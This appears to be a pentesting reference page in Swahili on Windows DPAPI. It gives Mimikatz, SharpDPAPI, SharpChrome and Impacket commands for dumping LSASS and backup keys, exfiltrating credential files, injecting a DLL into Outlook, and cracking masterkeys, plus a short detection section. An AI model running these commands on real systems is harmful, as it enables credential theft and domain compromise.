# DPAPI - Kutoa Nywila

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni nini

Data Protection API (DPAPI) hutumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kwa **symmetric encryption ya asymmetric private keys**, ikitumia secrets za user au system kama chanzo muhimu cha entropy. Mbinu hii hurahisisha encryption kwa developers kwa kuwawezesha ku-encrypt data kwa kutumia key inayotokana na logon secrets za user au, kwa system encryption, domain authentication secrets za system. Hivyo, developers hawahitaji kusimamia ulinzi wa encryption key wenyewe.

Njia inayotumika zaidi kutumia DPAPI ni kupitia functions za **`CryptProtectData` na `CryptUnprotectData`**, ambazo huruhusu applications ku-encrypt na ku-decrypt data kwa kutumia security context ya process iliyo logged-on kwa sasa. Kwa default, data inaweza ku-decryptiwa tu na user au system context ileile iliyo-encrypt data hiyo.<sup>[[2]](#references)[[3]](#references)</sup>

Functions hizi pia hupokea **entropy parameter** ya hiari inayotumika wakati wa encryption na decryption. Data iliyolindwa kwa optional entropy inahitaji entropy value hiyo hiyo ili ku-decryptiwa.<sup>[[2]](#references)[[6]](#references)</sup>

### Uzalishaji wa key za users

DPAPI hutengeneza user-specific value (ambayo mara nyingi huitwa **pre-key**) kutokana na credentials za user. Derivation halisi hutegemea account na operating-system version. Kwa mfano, Impacket hujaribu HMAC-SHA1 path inayotegemea SHA-1 digest ya password ya UTF-16LE, nyingine inayotegemea MD4/NT hash ya password, na PBKDF2-SHA256-derived path kwa Protected Users. Hii ndiyo sababu offline tooling mara nyingi inaweza kupata material inayohitajika kutoka kwa plaintext password au NT hash inayopatikana.<sup>[[2]](#references)[[10]](#references)</sup>

Hili linavutia sana kwa sababu ikiwa attacker anaweza kupata password hash ya user, anaweza:

- **Ku-decrypt data yoyote iliyokuwa ime-encryptiwa kwa kutumia DPAPI** na key ya user huyo bila kuhitaji kuwasiliana na API yoyote
- Kujaribu **ku-crack password** offline ili kujaribu kutengeneza DPAPI key sahihi

DPAPI hudumisha **master keys** moja au zaidi kwa kila user badala ya kutengeneza master key mpya kwa kila protected blob. Kila master key ina **GUID** (Globally Unique Identifier), na encrypted blob huhifadhi taarifa ya master key inayolinda blob hiyo.<sup>[[2]](#references)</sup>

Master keys huhifadhiwa katika directory ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya user. Master-key file ina material iliyolindwa na **pre-key** ya user na, kwa domain users, recovery material iliyolindwa na **domain backup key**.<sup>[[2]](#references)</sup>

Kumbuka kwamba **domain key inayotumika ku-encrypt master key iko kwenye domain controllers na haibadiliki kamwe**, hivyo ikiwa attacker ana access kwa domain controller, anaweza kupata domain backup key na ku-decrypt master keys za users wote katika domain.<sup>[[2]](#references)</sup>

Encrypted blobs zina **GUID ya master key** iliyotumika ku-encrypt data iliyo ndani ya headers zake.

> [!TIP]
> DPAPI encrypted blobs huanza na **`01 00 00 00`**

Tafuta master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Hivi ndivyo kundi la Master Keys za user litakavyoonekana:

![What is DPAPI - Users key generation: Hivi ndivyo kundi la Master Keys za user litakavyoonekana](<../../images/image (1121).png>)

### Uundaji wa machine/system key

Hii ni key inayotumiwa na machine kusimba data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni key maalum inayoweza kufikiwa na user wa SYSTEM pekee. Key hii hutumiwa kusimba data inayohitaji kufikiwa na system yenyewe, kama vile machine-level credentials au system-wide secrets.<sup>[[2]](#references)</sup>

Kumbuka kwamba keys hizi **hazina domain backup**, kwa hivyo zinapatikana locally pekee:

- **Mimikatz** inaweza kuifikia kwa kudump LSA secrets kwa kutumia command: `mimikatz lsadump::secrets`
- Secret huhifadhiwa ndani ya registry, kwa hivyo administrator anaweza **kubadilisha ruhusa za DACL ili kuifikia**. Registry path ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction kutoka registry hives pia inawezekana. Kwa mfano, ukiwa administrator kwenye target, hifadhi hives na uziexfiltrate:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Kisha kwenye analysis box yako, rejesha DPAPI_SYSTEM LSA secret kutoka kwenye hives na uitumie kufungua machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, n.k.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Mfano wa DPAPI maalum kwa Veeam:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Data Inayolindwa na DPAPI

Miongoni mwa data binafsi inayolindwa na DPAPI ni:

- Windows creds
- Passwords na data ya auto-completion ya Internet Explorer na Google Chrome
- Passwords za barua pepe na akaunti za ndani za FTP kwa applications kama Outlook na Windows Mail
- Passwords za shared folders, resources, wireless networks, na Windows Vault, pamoja na encryption keys
- Passwords za miunganisho ya remote desktop, .NET Passport, na private keys kwa madhumuni mbalimbali ya encryption na authentication
- Network passwords zinazosimamiwa na Credential Manager na data binafsi katika applications zinazotumia CryptProtectData, kama Skype, MSN messenger, na nyinginezo
- Encrypted blobs ndani ya registry
- ...

Data inayolindwa na mfumo inajumuisha:
- Wi-Fi passwords
- Passwords za scheduled tasks
- ...

### Chaguo za kutoa master key

- Ikiwa user ana domain admin privileges, anaweza kufikia **domain backup key** ili ku-decrypt master keys zote za users katika domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Kwa privileges za local admin, inawezekana **access LSASS memory** ili kutoa DPAPI master keys za users wote waliounganishwa pamoja na SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa mtumiaji ana privileges za **local admin**, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili kufungua master keys za mashine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ikiwa password au NTLM hash ya user inajulikana, unaweza **ku-decrypt master keys za user moja kwa moja**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya **session** kama **user**, inawezekana kuiomba DC **backup key ya ku-decrypt master keys kwa kutumia RPC**. Ikiwa wewe ni local admin na user ameingia, unaweza **ku-steal session token yake** kwa ajili ya hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodhesha Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Fikia Data Iliyosimbwa kwa DPAPI

### Tafuta data iliyosimbwa kwa DPAPI

Faili zinazolindwa za watumiaji wa kawaida ziko kwenye:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Pia angalia ukibadilisha `\Roaming\` kuwa `\Local\` kwenye paths zilizo hapo juu.

Mifano ya enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata blobs za DPAPI zilizosimbwa kwa njia fiche katika mfumo wa faili, registry na blobs za B64:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo hiyo hiyo) inaweza kutumiwa kusimbua data nyeti kama vile cookies kwa kutumia DPAPI.<sup>[[12]](#references)</sup>

#### Mapishi ya haraka ya Chromium/Edge/Electron (SharpChrome)

- Mtumiaji wa sasa, usimbuaji shirikishi wa logins/cookies zilizohifadhiwa (hufanya kazi hata na app-bound cookies za Chrome 127+ kwa sababu key ya ziada hupatikana kutoka kwa Credential Manager ya mtumiaji inapoendeshwa katika user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Uchambuzi wa offline unapokuwa na files pekee. Kwanza extract AES state key kutoka kwenye "Local State" ya profile, kisha uitumie ku-decrypt cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage ya domain nzima/kwa mbali unapokuwa na DPAPI domain backup key (PVK) na admin kwenye host lengwa:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na kusimbua moja kwa moja data ya profile:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notes
- Chrome/Edge builds mpya zaidi zinaweza kuhifadhi baadhi ya cookies kwa kutumia usimbaji fiche wa "App-Bound". Uondoaji wa usimbaji fiche wa cookies hizo mahususi ukiwa offline hauwezekani bila app-bound key ya ziada; endesha SharpChrome chini ya muktadha wa mtumiaji lengwa ili kuipata kiotomatiki. Tazama chapisho la blogu ya usalama ya Chrome lililotajwa hapa chini.<sup>[[5]](#references)</sup>

### Vifunguo vya ufikiaji na data

- **Tumia SharpDPAPI** kupata credentials kutoka kwa faili zilizosimbwa kwa DPAPI za session ya sasa:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata maelezo ya credentials** kama vile data iliyosimbwa na guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Decrypt masterkey ya mtumiaji anayeomba **domain backup key** kupitia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Zana ya **SharpDPAPI** pia inasaidia arguments hizi za masterkey decryption (kumbuka kwamba inawezekana kutumia `/rpc` kupata domain backup key, `/password` kutumia plaintext password, au `/pvk` kubainisha faili ya DPAPI domain private key...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt data kwa kutumia masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Zana ya **SharpDPAPI** pia inatumia arguments hizi kwa decryption ya `credentials|vaults|rdg|keepass|triage|blob|ps` (angalia jinsi inavyowezekana kutumia `/rpc` kupata domain backup key, `/password` kutumia plaintext password, `/pvk` kubainisha faili ya DPAPI domain private key, `/unprotect` kutumia session ya users wa sasa...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Kutumia DPAPI prekey/credkey moja kwa moja (hakuna password inayohitajika)

Ikiwa unaweza ku-dump LSASS, Mimikatz mara nyingi hufichua DPAPI key ya kila logon ambayo inaweza kutumika decryption ya masterkeys za mtumiaji bila kujua password ya plaintext. Pitisha value hii moja kwa moja kwenye tools:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Decrypt baadhi ya data kwa kutumia **current user session**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Usimbaji fiche wa offline kwa kutumia Impacket dpapi.py

Ikiwa una SID na password ya mtumiaji mwathiriwa (au NT hash), unaweza kusimbua masterkeys za DPAPI na Credential Manager blobs kabisa ukiwa offline kwa kutumia Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Tambua artefacts kwenye diski:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ikiwa zana za kuhamisha mafaili hazifanyi kazi vizuri, tumia base64 kwenye mafaili ukiwa kwenye host na unakili matokeo:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Decrypt `masterkey` kwa kutumia SID na password/hash ya mtumiaji:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Tumia masterkey iliyodecryptiwa kudecrypt credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Workflow hii mara nyingi hupata tena domain credentials zilizohifadhiwa na apps zinazotumia Windows Credential Manager, ikiwa ni pamoja na administrative accounts (mfano, `*_adm`).

---

### Handling Optional Entropy ("Third-party entropy")

Baadhi ya applications hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii, blob haiwezi ku-decryptiwa, hata kama masterkey sahihi inajulikana. Kwa hiyo, kupata entropy ni muhimu unapolenga credentials zilizolindwa kwa njia hii (mfano Microsoft Outlook, baadhi ya VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni user-mode DLL inayohook DPAPI functions ndani ya target process na kurekodi kwa uwazi optional entropy yoyote inayotolewa. Kuendesha EntropyCapture katika hali ya **DLL-injection** dhidi ya processes kama `outlook.exe` au `vpnclient.exe` kutatoa file inayohusisha kila entropy buffer na calling process pamoja na blob. Entropy iliyokamatwa inaweza baadaye kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili ku-decrypt data.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Kuvunja masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilianzisha muundo wa **context 3** wa masterkey kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3), zinazoruhusu cracking inayoharakishwa na GPU ya passwords za watumiaji moja kwa moja kutoka kwenye masterkey file. Kwa hivyo, attackers wanaweza kufanya word-list au brute-force attacks bila kuingiliana na target system.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) hu-automate mchakato:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Tool hii pia inaweza kuchanganua Credential na Vault blobs, kuzisimbua kwa kutumia keys zilizopasuliwa na ku-export cleartext passwords.<sup>[[8]](#references)</sup>


### Data za mashine nyingine

Katika **SharpDPAPI na SharpChrome** unaweza kubainisha option ya **`/server:HOST`** ili kufikia data ya mashine ya mbali. Bila shaka, unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inachukuliwa kuwa **domain backup encryption key inajulikana**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni tool inayoboresha kiotomatiki extraction ya users na computers wote kutoka kwenye LDAP directory, pamoja na extraction ya domain controller backup key kupitia RPC. Script kisha itatatua IP address za computers wote na kufanya smbclient kwenye computers wote ili kuretrieve DPAPI blobs zote za users wote na ku-decrypt kila kitu kwa kutumia domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Ukitumia computers list iliyotolewa kutoka LDAP, unaweza kupata kila sub network hata kama hukuijua hapo awali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kudump secrets zinazolindwa na DPAPI kiotomatiki. Toleo la 2.x lilianzisha:<sup>[[9]](#references)</sup>

* Parallel collection ya blobs kutoka kwa mamia ya hosts
* Parsing ya **context 3** masterkeys na integration ya automatic Hashcat cracking
* Support ya Chrome "App-Bound" encrypted cookies (tazama section inayofuata)
* Mode mpya ya **`--snapshot`** ya kupoll endpoints mara kwa mara na kutofautisha blobs mpya zilizoundwa

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni C# parser ya masterkey/credential/vault files inayoweza kutoa formats za Hashcat/JtR na, kwa hiari, kuanzisha cracking kiotomatiki. Inasupport kikamilifu machine na user masterkey formats hadi Windows 11 24H1.<sup>[[8]](#references)</sup>


## Ugunduzi wa kawaida

- Access kwa files zilizo kwenye `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na directories nyingine zinazohusiana na DPAPI.
- Hasa kutoka kwenye network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au tooling inayofanana kufikia LSASS memory au kudump masterkeys.
- Event **4662**: *An operation was performed on an object* – inaweza kuhusishwa na access kwa object ya **`BCKUPKEY`**.
- Event **4673/4674** wakati process inapoomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilities za 2023-2025 na mabadiliko ya ecosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Novemba 2023). Attacker mwenye network access angeweza kuidanganya domain member ili iretrieve malicious DPAPI backup key, na hivyo kuruhusu decryption ya user masterkeys. Iliwekewa patch katika November 2023 cumulative update – administrators wanapaswa kuhakikisha kuwa DCs na workstations zimewekewa patches zote.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Julai 2024) ilibadilisha ulinzi wa zamani wa DPAPI-only na kuweka key ya ziada chini ya **Credential Manager** ya user. Offline decryption ya cookies sasa inahitaji DPAPI masterkey pamoja na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurecover key hiyo ya ziada zinapoendeshwa kwa user context.<sup>[[5]](#references)</sup>


### Uchunguzi wa Kesi: Zscaler Client Connector – Custom Entropy Iliyotokana na SID

Zscaler Client Connector huhifadhi configuration files kadhaa chini ya `C:\ProgramData\Zscaler` (kwa mfano, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila file ime-encryptiwa kwa **DPAPI (Machine scope)**, lakini vendor hutoa **custom entropy** ambayo *inahesabiwa wakati wa runtime* badala ya kuhifadhiwa kwenye disk.<sup>[[1]](#references)</sup>

Entropy hiyo hujengwa upya kutoka kwa elements mbili:

1. Secret iliyowekwa moja kwa moja ndani ya `ZSACredentialProvider.dll`.
2. **SID** ya Windows account ambayo configuration hiyo inahusishwa nayo.

Algorithm iliyotekelezwa na DLL ni sawa na:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Kwa sababu siri imepachikwa ndani ya DLL inayoweza kusomwa kutoka kwenye diski, **mshambuliaji yeyote wa ndani aliye na haki za SYSTEM anaweza kutengeneza upya entropy ya SID yoyote** na kusimbua blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption hutoa JSON configuration kamili, ikijumuisha kila **device posture check** na value yake inayotarajiwa – taarifa yenye thamani kubwa sana wakati wa kujaribu client-side bypasses.

> TIP: artefacts nyingine zilizosimbwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zinalindwa kwa DPAPI **bila** entropy (`16` zero bytes). Kwa hivyo zinaweza ku-decryptiwa moja kwa moja kwa `ProtectedData.Unprotect` mara tu SYSTEM privileges zinapopatikana.

## References

- [1] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kupita posture checks za Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Siri za DPAPI. Uchambuzi wa usalama na data recovery katika DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Kusoma DPAPI Encrypted Secrets kwa Mimikatz na C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Kuboresha usalama wa Chrome cookies kwenye Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Simple Extraction of DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
